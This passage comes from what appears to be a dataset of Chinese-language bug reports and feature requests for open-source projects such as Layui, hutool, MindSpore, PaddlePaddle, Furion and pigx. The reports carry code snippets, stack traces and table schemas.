SocketAddress socketAddress) at System.Net.Sockets.Socket.Bind(EndPoint localEP) at FastTunnel.Core.Listener`1..ctor(String ip, Int32 port, ILogger`1 logerr, Action`2 acceptCustomerHandler, T data) at FastTunnel.Core.Core.FastTunnelServer.ListenFastTunnelClient() at FastTunnel.Core.Core.FastTunnelServer.Run() at FastTunnel.Server.Program.Run(IServiceProvider servicesProvider) at FastTunnel.Server.Program.Main(String[] args)"
【建议】table分页能不能添加一个beforesend功能,"版本：Layui 2.7.5 描述：在进行分页时能不能提供一个类似 $.ajax 里的beforesend，用来对分页请求做一些预处理，有些接口可能不是用page，limit来控制当前请求的页数和每页的条目数的，而是利用偏移量来进行计算页数的，例如arcgis server 里的query请求，它的分页是依靠resultRecordCount（一次请求获取的结果数）和resultOffset（数据偏移量）来实现的。因此需要在请求前对page参数从新计算。现在可以利用ajaxSetup.beforesend进行配置。 $.ajaxSetup({ beforeSend: function (xhr,setting) { var url = layui.url(setting.url).search; var resultRecordCount = url.resultRecordCount; var resultOffset = (parseInt(url.page) - 1) * parseInt(resultRecordCount); setting.url = }, }); 表格异步的request： request: { //pageName: 'resultOffset' //页码的参数名称，默认：page limitName: 'resultRecordCount' //每页数据量的参数名，默认：limit },   <code>: ${setting.url}&amp;resultOffset=${resultOffset}"
"问题反馈：explode() expects parameter 2 to be string, null given","需求类型：【BUG提交】 所属仓库：【ApiAdmin】 系统环境：【PHP 7.3.25 ，Nginx 1.19.4 &amp; CentOS 7.0，ApiAdmin:v5.0.0，ApiAdmin-WEB：master】 报错链接：【app/middleware/handle】 报错信息：【TP:explode() expects parameter 2 to be string, null given】 【TP Traces】 traces: [{name: ""TypeError"", file: ""/www/wwwroot/<em>.com/app/middleware/ApiPermission.php"", line: 24,…}] 0: {name: ""TypeError"", file: ""/www/wwwroot/</em>.com/app/middleware/ApiPermission.php"", line: 24,…} code: 0 file: ""/www/wwwroot/*****.com/app/middleware/ApiPermission.php"" line: 24 message: ""explode() expects parameter 2 to be string, null given"" name: ""TypeError"" 【补充说明】 打印返回的信息都是空的。 【Query String Parameters】 app_id: 14019102 device_id: a0001 rand_str: 123 timestamp: 1607832727824 signature: bdac96ebd11ef8d0418398300c740738 【Request Headers】 :authority: *****.com :method: GET :path: /api/5fd4c9175e7de?app_id=14019102&amp;device_id=a0001&amp;rand_str=123&amp;timestamp=1607832727824&amp;signature=bdac96ebd11ef8d0418398300c740738 :scheme: https accept: application/json, text/plain, <em>/</em> accept-encoding: gzip, deflate, br accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 origin: http://127.0.0.1:8010 referer: http://127.0.0.1:8010/ sec-fetch-dest: empty sec-fetch-mode: cors sec-fetch-site: cross-site user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 【Response Headers】 access-control-allow-credentials: true access-control-allow-headers: Version, Access-Token, User-Token, Api-Auth, User-Agent, Keep-Alive, Origin, No-Cache, X-Requested-With, If-Modified-Since, Pragma, Last-Modified, Cache-Control, Expires, Content-Type, X-E4M-With access-control-allow-methods: POST,PUT,GET,DELETE access-control-allow-origin: * content-type: application/json; charset=utf-8 date: Sun, 13 Dec 2020 04:12:10 GMT server: nginx 【General】 Request URL: https://*****.com/api/5fd4c9175e7de?app_id=14019102&amp;device_id=a0001&amp;rand_str=123&amp;timestamp=1607832727824&amp;signature=bdac96ebd11ef8d0418398300c740738 Request Method: GET Status Code: 500 Remote Address: ****:443 Referrer Policy: strict-origin-when-cross-origin   <code>: print_r $appInfo = $request-&gt;APP_CONF_DETAIL; $apiInfo = $request-&gt;API_CONF_DETAIL;"
Enhance AvgPooling to support both include_mode and exclude_mode,"resolve #6099:""add multikernel type register"" When configuring, use to indicate whether to exclude the padding cells when calculating, but only work when is . If use cudnn, use or as to identify the mode. I have validated the output.   <code>: exclude_mode pool_type AvgPooling CudnnAvgPooling CudnnAvgInclPadPooling pool_type"
被wps编辑过后FileTypeUtil.getType不能正确的识别文件类型,"JDK版本： openjdk_8_201 hutool版本： 5.7.10 这个问题的修复在 https://gitee.com/dromara/hutool/blob/v5-master/hutool-core/src/main/java/cn/hutool/core/io/FileTypeUtil.java#L182 这行代码之后在加入关于docx的判断 docx文件可在这下载 业务需求申请表.docx   <code>: public void t() throws IOException { String type = FileUtil.getType(new File(""D:/adb/业务需求申请表.docx"")); System.out.println(type); // 这个输出为jar }"
 import paddle.fluid后logging模块无法使用,"import paddle.fluid之后 python的logging模块失效，注销掉之后就正常   <code>: import logging import paddle.fluid as fluid if __name__ == ""__main__"": logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s') logger = logging.getLogger('test') logger.info('This is a log info') import paddle.fluid as fluid"
[CT][MS][logit]Not support fp64 for function logit at ascend,"接口logit ascend后端不支持fp64, cpu和gpu上支持 / 硬件环境: /device ascend/ : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph ascend上执行测试用例 与cpu, gpu后端一致， 都支持fp64   <code>: def test_functional_logit_input_dtype_float64_7d(): input_list = [] x0 = Tensor(np.random.randn(16, 16, 16, 16, 16, 16, 16).astype(np.float64)) input_list.append(x0) attributes = {'eps': -0.18247968355031485} fact = LogitMock( attributes=attributes, inputs=input_list) &gt; fact.forward_cmp() def test_functional_logit_input_dtype_float64_7d(): input_list = [] x0 = Tensor(np.random.randn(16, 16, 16, 16, 16, 16, 16).astype(np.float64)) input_list.append(x0) attributes = {'eps': -0.18247968355031485} fact = LogitMock( attributes=attributes, inputs=input_list) &gt; fact.forward_cmp() E TypeError: Can not select a valid kernel info for [Logit] in AI CORE or AI CPU kernel info candidates list: E AI CORE: E {} E AI CPU: E (&lt;Float16xDefaultFormat&gt;) -&gt; (&lt;Float16xDefaultFormat&gt;) E (&lt;Float32xDefaultFormat&gt;) -&gt; (&lt;Float32xDefaultFormat&gt;) E"
在默认请求客户端下，RequestUrl 不可为空的问题（不算 BUG ）,"Furion 版本号 4.3.4 .NET SDK 版本号 .NET6 Web 项目类型 WebApi 操作系统和版本 Windows 代码环境 开发环境（Development） 第 一 个问题： 当前项目使用远程请求的 IHttpDispatchProxy 代理方式，默认请求客户端配置了 BaseAddress ，如果代理请求的 Requesturl 为空，肯定会报错。因为大部分 URL 都是在 HttpClient 中处理的，如果刚好代理的特性上没有 Requesturl 就很难受。 如下： 因为有下面的判断（HttpRequestPart 中的 SendAsync 方法），所以必报错： 所以，如果 sender.ClientName 等于空（默认配置），RequestUrl 就一定不能为空么，这个逻辑能不能改变？ 由于 string.IsNullOrWhiteSpace(sender.RequestUrl) 是在 HttpRequestMessage 拦截 之前判断的，所以我想在 HttpRequestMessage 拦截中提前处理 RequestUrl 避免报错也是没办法。 第 二 个问题： 目前看来，代理请求方法中的相关特性（Get/QueryString）都是必填的，不填会报错。可不可以懒一点，就沿用动态 API 的逻辑，让他们有个默认值。   <code>: service.AddHttpClient(string.Empty, client =&gt; { client.BaseAddress = new Uri(""https://localhost:5001/api/""); // client.DefaultRequestHeaders.Add(""Accept"", """"); // client.DefaultRequestHeaders.Add(""User-Agent"", """"); } /// 是一个泛型的，最终会在 HttpClient 拦截或者请求之前拦截 中获取并附上当前实体名称 [Put("""")] Task&lt;RESTfulResult&lt;bool&gt;&gt; UpdateAsync([Body] T obj); [Get(""findById"")] Task&lt;RESTfulResult&lt;T&gt;&gt; FindByIdAsync([QueryString]object key); /// &lt;summary&gt; /// HttpClient 拦截 /// &lt;/summary&gt; /// &lt;param name=""req""&gt;&lt;/param&gt; [Interceptor(InterceptorTypes.Client)] static void OnBaseClientCreating(HttpClient req) { if (req.BaseAddress == null) { throw Oops.Oh(""请求 Uri 为空""); } var builder = new UriBuilder(req.BaseAddress!); var path = req.BaseAddress!.AbsolutePath; var name = typeof(T).Name.Replace(""Entity"", string.Empty); builder.Path = $""{path}{string.Concat(name.First().ToString().ToLower(), name.AsSpan(1))}/""; req.BaseAddress = builder.Uri; } /// &lt;summary&gt;发送请求&lt;/summary&gt; /// &lt;param name=""cancellationToken""&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public async Task&lt;HttpResponseMessage&gt; SendAsync( CancellationToken cancellationToken = default (CancellationToken)) { HttpRequestPart sender = this; if (sender.Method == (HttpMethod) null) throw new NullReferenceException(""Method""); if (string.IsNullOrWhiteSpace(sender.ClientName) &amp;&amp; string.IsNullOrWhiteSpace(sender.RequestUrl)) throw new NullReferenceException(sender.RequestUrl); } [Get(""findById"")] Task&lt;RESTfulResult&lt;T&gt;&gt; FindByIdAsync([QueryString]object key); throw new NullReferenceException(sender.RequestUrl); System.NullReferenceException: Exception of type 'System.NullReferenceException' was thrown. at Furion.RemoteRequest.HttpRequestPart.SendAsync(CancellationToken cancellationToken) at Furion.RemoteRequest.HttpRequestPart.SendAsStringAsync(CancellationToken cancellationToken) at Furion.RemoteRequest.HttpRequestPart.SendAsAsync[T](CancellationToken cancellationToken) at Furion.Reflection.AspectDispatchProxyGenerator.InvokeAsync[T](Object[] args) at HelloService.caiyun(CaiYun searchInfos) in D:\OneDrive\Code\HelloFurion\Program.cs:line 19"
HttpUtil  post请求中文乱码,"JDK版本： jdk1.8.0_191 hutool版本： 5.3.7 响应的结果中文乱码，经过debug发现。问题如下： 在方法中，执行时，内部调用了方法，通过获取了响应的编码方式。 但是，在方法中，在这一行代码执行之前，httpConnection.getCharset()都是utf-8，执行完之后就变成了iso-8859-1，所以导致在中将编码修改为iso-8859-1了，是否我使用有问题？求解。   <code>: // 我也通过createPost方法手动指定了utf-8编码，依然乱码 String createPayeeResponseStr = HttpUtil.post(url, jsonStr); cn.hutool.http.HttpRequest#execute(boolean) httpResponse = new HttpResponse(this.httpConnection, this.charset, isAsync, isIgnoreResponseBody()); cn.hutool.http.HttpResponse#init final Charset charset = httpConnection.getCharset(); cn.hutool.http.HttpRequest#sendFormUrlEncoded IoUtil.write(this.httpConnection.getOutputStream(), true, content); cn.hutool.http.HttpResponse#init"
某些表代码生成后台报错,"环境信息 pigx版本: 4.0.0 是否修改包名: 无 提供详细 如图，选中这三张表点“批量生成”前端错误提示“系统未知错误 请报告给管理员” 后台错误信息： org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.TooManyResultsException: Expected one result (or null) to be returned by selectOne(), but found: 2 at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:92) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:440) at com.sun.proxy.$Proxy177.selectOne(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectOne(SqlSessionTemplate.java:159) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:90) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) at com.sun.proxy.$Proxy257.queryTable(Unknown Source) at sun.reflect.GeneratedMethodAccessor221.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:344) at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:198) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at com.baomidou.dynamic.datasource.aop.DynamicDataSourceAnnotationInterceptor.invoke(DynamicDataSourceAnnotationInterceptor.java:46) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:215) at com.sun.proxy.$Proxy258.queryTable(Unknown Source) at com.pig4cloud.pigx.codegen.service.impl.GeneratorServiceImpl.generatorCode(GeneratorServiceImpl.java:114) at com.pig4cloud.pigx.codegen.controller.GeneratorController.generatorCode(GeneratorController.java:87) at sun.reflect.GeneratedMethodAccessor269.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1060) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:962) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:665) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:327) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:81) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:119) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:113) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:126) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:81) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:105) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter.doFilter(OAuth2AuthenticationProcessingFilter.java:176) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:103) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:89) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:110) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:80) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:55) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:211) at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:183) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at com.pig4cloud.pigx.common.data.tenant.TenantContextHolderFilter.doFilter(TenantContextHolderFilter.java:65) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.jrHandle(ServletInitialHandler.java:40001) at org.zeroturnaround.javarebel.integration.servlet.undertow.cbp.ServletInitialHandlerCBP.handleRequest(ServletInitialHandlerCBP.java:131) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:387) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:841) at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) at java.lang.Thread.run(Thread.java:748) Caused by: org.apache.ibatis.exceptions.TooManyResultsException: Expected one result (or null) to be returned by selectOne(), but found: 2 at org.apache.ibatis.session.defaults.DefaultSqlSession.selectOne(DefaultSqlSession.java:80) at sun.reflect.GeneratedMethodAccessor220.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:426) ... 126 common frames omitted 附这三张表的表结构： ----------表sys_user_fee_course--------- DROP TABLE IF EXISTS ; CREATE TABLE ( int(11) NOT NULL AUTO_INCREMENT COMMENT '付费课程Id', int(11) NOT NULL COMMENT '用户Id【sys_user】', int(11) NOT NULL COMMENT '课程Id【res_course】', smallint(6) NOT NULL DEFAULT 0 COMMENT '绑定设备数量', smallint(6) NOT NULL DEFAULT 0 COMMENT '删除次数', datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间', int(11) NOT NULL COMMENT '租户Id【sys_tenant】', PRIMARY KEY () USING BTREE, UNIQUE Key (,) USING BTREE ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户付费课程表'; ----------表sys_user_share_log--------- DROP TABLE IF EXISTS ; CREATE TABLE ( int(11) NOT NULL AUTO_INCREMENT COMMENT '分享Id', int(11) NOT NULL COMMENT '用户Id【sys_user】', char(1) NOT NULL COMMENT '分享类别[user_share_type]', char(1) NOT NULL COMMENT '分享目标[user_share_target]', datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '分享时间', int(11) NOT NULL COMMENT '租户Id【sys_tenant】', PRIMARY KEY () USING BTREE ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户分享日志表'; ----------表sys_user_msg--------- DROP TABLE IF EXISTS ; CREATE TABLE ( int(11) NOT NULL AUTO_INCREMENT COMMENT '消息Id', int(11) NOT NULL COMMENT '用户Id【sys_user】', char(1) NOT NULL COMMENT '消息类别[user_msg_type]', int(11) NOT NULL DEFAULT 0 COMMENT '关联记录Id【cls_class/res_component/res_course/stu_teach_topic】', int(11) NOT NULL DEFAULT 0 COMMENT '发送用户Id【sys_user】,msg_type=2,3,4,5', smallint(6) NOT NULL DEFAULT 0 COMMENT '消息数量', varchar(20) NOT NULL DEFAULT '' COMMENT '提示标题', varchar(100) NOT NULL COMMENT '最新消息', datetime NOT NULL COMMENT '最新消息发送时间', datetime NULL DEFAULT NULL COMMENT '最后阅读时间(msg_type=1)', int(11) NOT NULL COMMENT '租户Id【sys_tenant】', PRIMARY KEY () USING BTREE, KEY () USING BTREE ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户消息表';   <code>: sys_user_fee_course sys_user_fee_course fee_id user_id course_id device_count delete_count create_time tenant_id fee_id idx1 user_id course_id sys_user_share_log sys_user_share_log id user_id share_type share_target share_time tenant_id id sys_user_msg sys_user_msg msg_id user_id msg_type rel_rec_id send_user_id msg_count hint_title last_msg last_send_time last_read_time tenant_id msg_id idx1 user_id"
mp报错 selectObjs,"当前使用版本 最新版本 3.3.2 新版本也测试出现了该问题 Caused by: java.lang.IllegalArgumentException: Mapped Statements collection does not contain value for com.baomidou.mybatisplus.core.mapper.SqlRunner.SelectObjs   <code>: List&lt;Object&gt; tableLists = SqlRunner.db().selectObjs(""SHOW TABLES"");"
[CT][MS][TridiagonalMatMul]  Cannot create BaseOperator for TridiagonalMatMul,"拿最新的master包跑的时候正常用例全部出现问题 报错看下面的日志 / 硬件环境: /device CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph pynative模式 图模式   <code>: self = &lt;mindspore.common.api._PyNativeExecutor object at 0x7f18d1c0a8d0&gt;, obj = WrapOp&lt;&gt; output = &lt;[RuntimeError('SyncDeviceToHost failed.\n\n----------------------------------------------------\n- C++ Call Stack: (F...---------------------\nmindspore/core/ir/tensor.cc:875 data_sync\n') raised in repr()] Tensor object at 0x7f15bfc84ad0&gt; args = (&lt;[RuntimeError('SyncDeviceToHost failed.\n\n----------------------------------------------------\n- C++ Call Stack: (...--------------------\nmindspore/core/ir/tensor.cc:875 data_sync\n') raised in repr()] Tensor object at 0x7f15bfc846b0&gt;) kwargs = {} def end_graph(self, obj, output, *args, **kwargs): """""" Clean resources after building forward and backward graph. Args: obj (Function/Cell): The function or cell instance. output (Tensor/tuple/list): Function or cell output object. args (tuple): Function or cell input arguments. kwargs (dict): keyword arguments. Return: None. """""" &gt; self._executor.end_graph(obj, output, *args, *(kwargs.values())) E RuntimeError: Cannot create BaseOperator for TridiagonalMatMul E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/kernel/common_utils.cc:165 CreateOperatorByCNode /root/miniconda3/envs/cpm/lib/python3.7/site-packages/mindspore/common/api.py:1010: RuntimeError [WARNING] VM(82213,7f15c4881700,python):2022-11-01-21:44:46.904.811 [mindspore/ccsrc/runtime/pynative/op_task.h:104] Run] Op build failed, no need to launch. self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7fc7edebad10&gt;, obj = WrapOp&lt;&gt;, phase = 'train.1667349513520125184.140483811243984.6', do_convert = True, jit_config_dict = {} args = (Tensor(shape=[3, 4, 5, 6, 7, 8, 1, 10], dtype=Float32, value= [[[[[[[[ 8.39142132e+00, 4.31919575e+00, 4.81073284e+... [ 3.22527361e+00, 6.75622988e+00, 1.52482581e+00 ... 2.91849637e+00, 9.05848503e+00, 1.42349100e+00]]]]]]]])) def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E RuntimeError: Cannot create BaseOperator for TridiagonalMatMul E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/kernel/common_utils.cc:165 CreateOperatorByCNode /root/miniconda3/envs/cpm/lib/python3.7/site-packages/mindspore/common/api.py:1363: RuntimeError"
